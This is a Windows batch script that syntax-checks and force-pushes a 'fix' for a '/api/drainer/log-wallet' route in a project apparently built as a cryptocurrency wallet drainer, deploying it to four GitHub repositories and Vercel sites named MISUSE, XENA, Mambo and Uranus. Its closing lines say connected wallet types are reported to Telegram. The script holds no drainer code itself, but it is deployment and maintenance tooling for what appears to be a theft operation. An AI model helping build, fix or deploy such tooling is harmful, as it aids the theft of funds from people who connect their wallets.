@echo off
echo ========================================
echo FIX WALLET LOGGING 400 ERROR
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo FIXES APPLIED
echo ========================================
echo.
echo 1. ROUTE ORDER FIX
echo - Moved specific routes before generic routes
echo - /api/drainer/log-wallet now comes before /api/drainer
echo - Prevents route conflicts
echo.
echo 2. ENHANCED ERROR HANDLING
echo - Added request body and headers logging
echo - Added validation for required fields
echo - Better error messages with details
echo.
echo 3. DEBUGGING IMPROVEMENTS
echo - Added console.log for request body
echo - Added console.log for request headers
echo - Added validation error logging
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c api/drainer.js
if %errorlevel% neq 0 (
    echo ERROR: api/drainer.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ api/drainer.js syntax OK
echo.
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING FIXES
echo ========================================
echo.
git add .
git commit -m "FIX: Wallet logging 400 error - reordered routes, added validation, enhanced error handling"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo FIXES DEPLOYED
echo ========================================
echo.
echo ✓ Route order fixed
echo ✓ Enhanced error handling
echo ✓ Better debugging
echo ✓ All repositories updated
echo.
echo EXPECTED IMPROVEMENTS:
echo - No more 400 errors on wallet logging
echo - Wallet type should now be reported to Telegram
echo - Better error messages for debugging
echo - Proper route handling
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo WALLET LOGGING 400 ERROR HAS BEEN FIXED!
pause
